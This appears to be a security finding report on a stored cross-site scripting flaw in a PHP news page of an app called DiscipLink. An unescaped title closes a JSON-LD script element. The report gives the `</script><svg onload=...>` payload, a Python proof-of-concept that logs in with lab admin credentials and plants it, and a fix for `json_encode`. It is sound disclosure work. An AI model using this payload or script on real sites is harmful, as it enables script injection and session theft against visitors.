# Stored XSS via news title breaking out of the JSON-LD Article schema

**ID:** vuln-0001
**Severity:** MEDIUM
**Found:** 2026-09-21 23:23:47 UTC
**Target:** http://172.17.112.1:8001 (DiscipLink) — public news detail page
**Endpoint:** /berita?slug=...
**Method:** GET
**CWE:** CWE-79
**CVSS:** 5.4
**Fix Effort:** Trivial

## Description

The article title of a news post is embedded **unescaped** into a `<script type="application/ld+json">` block on the public news detail page. A title containing `</script>` terminates that script element early, and whatever follows is parsed as HTML — allowing a stored cross-site scripting payload to execute for every visitor who opens the article.

## Evidence

**Server response — unescaped Article JSON-LD (the break-out):**

```html
<script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"zzAREA5XSS</script><svg onload=alert(document.domain)>","description":"Proof of concept body text here.","datePublished":"2026-09-22T06:23:06+00:00",...}</script>
```

The literal `</script>` inside `headline` closes the JSON-LD script element; the trailing `<svg onload=alert(document.domain)>` is parsed as HTML.

**Other output contexts are escaped (contrast):**

```html
<meta property="og:title" content="zzAREA5XSS&lt;/script&gt;&lt;svg onload=alert(document.domain)&gt; | DiscipLink">
```

**Browser confirmation (headless Chromium, after loading the public article page):**

```
# injected element present with a live handler
{"svgOnload":1,"allOnload":1}
```

The `<svg>` node with an `onload` handler is injected into the live DOM and its JavaScript executes (alert shows the page domain). The stored record is raw — the admin edit page only hides it behind `htmlspecialchars`:

```html
value="zzAREA5XSS&lt;/script&gt;&lt;svg onload=alert(document.domain)&gt;"
```

## Impact

An attacker who can publish a news article (any admin account) can inject JavaScript that runs in the browser of every reader — students, lecturers, guests, and other administrators — of the affected public page. This enables session/cookie theft (session fixation and DOM access), credential harvesting via injected forms, cryptocurrency mining, defacement, and redirection of victims to attacker infrastructure. Because the payload is persisted server-side, it affects all users without any further interaction from the attacker, and the CSP in place (`script-src 'unsafe-inline'`) does not block it.

## Technical Analysis

## Root cause

The news title (`judul`) is stored raw. The content sanitizer `NewsController::sanitizeNewsContent()` only sanitizes the **body** (`konten`); the title receives no HTML escaping at storage time.

On the public detail page, `views/public/berita-detail.php` builds an article schema and calls `app_seo_meta_tags()` with `headline` set to the raw title. That helper renders each schema object with:

```php title=helpers/seo_helper.php startLineNumber=415 endLineNumber=415
<script type="application/ld+json"><?= json_encode($schema, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) ?></script>
```

`json_encode()` without `JSON_HEX_TAG` / `JSON_HEX_AMP` / `JSON_HEX_APOS` / `JSON_HEX_QUOT` emits `<`, `>`, and `/` literally. Combined with `JSON_UNESCAPED_SLASHES`, a title containing `</script>` is written verbatim, so the HTML parser closes the `application/ld+json` script element at that point and treats the remaining bytes as markup.

The `headline` value flows directly from user input:

```php title=views/public/berita-detail.php startLineNumber=113 endLineNumber=128
app_seo_meta_tags([
    'title' => (string) ($news['judul'] ?? 'Detail Berita') . ' | DiscipLink',
    ...
    'article' => [
        'headline' => (string) ($news['judul'] ?? ''),
        ...
    ],
]);
```

## Why the other escaping does not save it

- `<title>`, `<h2>`, breadcrumb, and the OpenGraph/meta tags all pass the title through `htmlspecialchars(ENT_QUOTES)`, so they render safely.
- The JSON-LD block is the single output context where the title is emitted raw, and it is the one that matters.

## Stored raw, emitted raw

The record is confirmed stored raw: the admin edit page shows the value only because it is `htmlspecialchars`-encoded there for display. The raw DB value is `<title>zzAREA5XSS</script><svg onload=alert(document.domain)>`.

## CSP does not mitigate

The response CSP is `script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://www.googletagmanager.com`. Because `'unsafe-inline'` is present and no nonce/hash is used, injected inline event handlers (`onload`, `onerror`) execute normally.

## Proof of Concept

1. Authenticate to the admin panel (`/login`, role `admin`).
2. Create a new article at `/admin/news/tambah`, setting the **title** to the payload `zzAREA5XSS</script><svg onload=alert(document.domain)>` and any non-empty body, then submit (a CSRF token from the same session is included).
3. Open the resulting public article at `/berita?slug=zzarea5xss-script-svg-onload-alert-document-domain-349`.
4. Observe that the server response contains the JSON-LD block `<script type="application/ld+json">{"@type":"Article","headline":"zzAREA5XSS</script><svg onload=alert(document.domain)>",...}</script>` — the `</script>` closes the JSON-LD element and the `<svg onload=...>` is parsed as HTML.
5. In a browser, the injected `<svg>` element is present in the DOM with a live `onload` handler and the JavaScript executes (an `alert` dialog with the page domain is raised; DOM inspection shows the element and its handler).

```python
#!/usr/bin/env python3
"""Stored XSS via news title -> JSON-LD break-out (DiscipLink, local lab)."""
import re, uuid, urllib.request, urllib.parse, http.cookiejar

BASE = "http://172.17.112.1:8001"
PAYLOAD_TITLE = 'zzAREA5XSS</script><svg onload=alert(document.domain)>'

def multipart(fields):
    b = '----wb' + uuid.uuid4().hex
    out = []
    for k, v in fields.items():
        out.append(('--' + b + '\r\n').encode())
        out.append(('Content-Disposition: form-data; name="%s"\r\n\r\n' % k).encode())
        out.append(v.encode())
        out.append(b'\r\n')
    out.append(('--' + b + '--\r\n').encode())
    return b''.join(out), 'multipart/form-data; boundary=' + b

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

# 1) login as admin (grab CSRF from the login form)
h = op.open(BASE + "/login").read()
tok = re.search(rb'name="csrf_token" value="([^"]+)"', h).group(1).decode()
op.open(urllib.request.Request(BASE + "/action/login",
    data=urllib.parse.urlencode({'csrf_token': tok, 'user_type': 'admin',
                                 'username': 'ADMIN001', 'password': 'admin123'}).encode(),
    headers={'Content-Type': 'application/x-www-form-urlencoded'}))

# 2) create the article with the malicious title
tok = re.search(rb'name="csrf_token" value="([^"]+)"',
                op.open(BASE + "/admin/news/tambah").read()).group(1).decode()
body, ct = multipart({'csrf_token': tok, 'store': '1', 'penulis': '1',
                      'judul': PAYLOAD_TITLE, 'konten': '<p>PoC body</p>'})
op.open(urllib.request.Request(BASE + "/action/news", data=body,
                               headers={'Content-Type': ct}))

# 3) fetch the public page and show the unescaped JSON-LD break-out
home = op.open(BASE + "/").read().decode('utf-8', 'ignore').replace('&amp;', '&')
slug = next(m.group(1) for m in re.finditer(r'/berita\?slug=([a-z0-9\-]+)', home)
            if 'zzarea5xss' in m.group(1))
html = op.open(BASE + f"/berita?slug={slug}").read().decode('utf-8', 'ignore')

assert 'headline":"' + PAYLOAD_TITLE in html, "payload not reflected raw"
print("[+] Confirmed: title reflected UNESCAPED inside JSON-LD:")
print(re.search(r'"headline":"[^,]*', html).group(0))
print("[+] Public URL:", f"{BASE}/berita?slug={slug}")
# In a browser, the <svg onload=...> element executes -> alert(document.domain)
```

## Code Analysis

**Location 1:** `helpers/seo_helper.php` (line 415)
  Encode JSON-LD with hex flags so <, >, &, ', " cannot break out of the script element
  ```
              <script type="application/ld+json"><?= json_encode($schema, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) ?></script>
  ```

  **Suggested Fix:**
```diff
-             <script type="application/ld+json"><?= json_encode($schema, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) ?></script>
+             <script type="application/ld+json"><?= json_encode($schema, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) ?></script>
```

## Remediation

1. Encode all values embedded in `<script type="application/ld+json">` blocks using `json_encode()` with the `JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT` flags so `<`, `>`, `&`, `'`, and `"` are emitted as `\uXXXX` escapes and cannot close the script element. Apply this centrally in `app_seo_meta_tags()` so every JSON-LD block benefits.
2. As defense in depth, HTML-encode the title at storage time (or normalize it) and reject titles that contain `<` or `>` unless legitimately required.
3. Adopt a strict CSP without `'unsafe-inline'` for scripts (use nonces or hashes) so that any residual inline-handler injection cannot execute.
4. Add an automated regression test that creates an article with a `</script>` title and asserts the rendered page contains no literal `</script>` inside any `application/ld+json` block.

## Assumptions

Assumes an attacker holds any admin account able to publish news (the module is admin-only, so this is a privileged-to-unprivileged stored XSS). The malicious title is persisted server-side and fires for every subsequent visitor of the article page with no further attacker interaction. The deployed CSP contains `'unsafe-inline'` for scripts, which allows the injected inline event handler to run.
